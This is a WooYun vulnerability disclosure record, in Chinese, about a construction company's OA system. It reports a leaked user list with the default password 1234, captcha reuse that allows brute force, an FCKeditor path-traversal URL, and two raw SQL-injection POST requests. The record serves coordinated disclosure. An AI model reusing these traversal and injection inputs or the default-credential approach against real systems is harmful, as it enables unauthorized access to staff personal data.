{"id": 83906, "wybug_id": "wooyun-2015-0146379", "wybug_title": "中国建筑四局OA系统多个安全漏洞打包", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-14 17:47", "wybug_open_date": "2015-12-03 08:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "注入", "遍历"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向公众公开  简要描述： 中国建筑四局OA系统存在文件遍历,弱口令,暴力破解,注入等多个安全漏洞。直接影响中建四局所有用户的个人信息保密安全。 详细说明：  1.信息泄漏http://**.**.**.**/help/downfile.jsp?fileName=denglubiao泄漏了OA系统人员登录用户名,并在文档中提到系统默认登录密码1234\n\n2.验证码可重复使用导致暴力破解发现漏洞1中泄漏的用户中有46个用户仍然使用系统默认密码.占此表单中2/5的用户数.只使用漏洞1中的文档中提到的用户进行暴力破解,由于时间关系未使用纯字母字典.\n\n\n\n3.文件遍历漏洞http://**.**.**.**//common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../../../../\n\n\n\n 修改CurrentFolder参数可以达到遍历C盘文件的效果4.注入漏洞进入OA系统后,多个页面存在注入漏洞.下面列出2个页面,红色为可注入参数POST http://**.**.**.**/cscecGuidang/searchGuidangList.action?search=true HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://**.**.**.**/cscecGuidang/searchGuidangList.action?search=trueAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**Content-Length: 286Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=000190W0G1Vg_agKOLrJVFxGItb:21SNTVFEUN; _5t_trace_sid=d0e5e0d22300207fce48ab2397c14a9f; _5t_trace_tms=1nextActivePageJs=&moduleName=402881f04029ee1b01402d59951500f1&status=1&deadline=&fitype=&searchObject.groupId=&treeId=&searchObject.title=2015&searchObject.scope=&searchObject.fromTime=&searchObject.toTime=&laiyuan=&page.currentPageNo=1&page.pageSize=15&page.totalPageCount=1&inputPage=POST http://**.**.**.**/addresslist/viewUserAdressOfDept.action?pageId=frmQuery HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://**.**.**.**/addresslist/viewUserAdressOfDept.action?pageId=frmQueryAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**Content-Length: 320Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=000190W0G1Vg_agKOLrJVFxGItb:21SNTVFEUN; _5t_trace_sid=d0e5e0d22300207fce48ab2397c14a9f; _5t_trace_tms=1nextActivePageJs=&currentGroupId=00000001&moduleName=&userAddressPageQueryForm.userName=%E7%BD%97%E4%B8%96%E5%A8%81&userAddressPageQueryForm.groupName=&userAddressPageQueryForm.job=&userAddressPageQueryForm.moble=&userAddressPageQueryForm.telephone=&page.currentPageNo=1&page.pageSize=15&page.totalPageCount=1&inputPage=\n\n   漏洞证明：     修复方案：  找专业人士修复   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-10-19 08:51 厂商回复：     CNVD确认并复现所述情况，已由CNVD通过网站管理方公开联系渠道向其邮件通报，由其后续提供解决方案。 按多个风险评分,rank 11 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}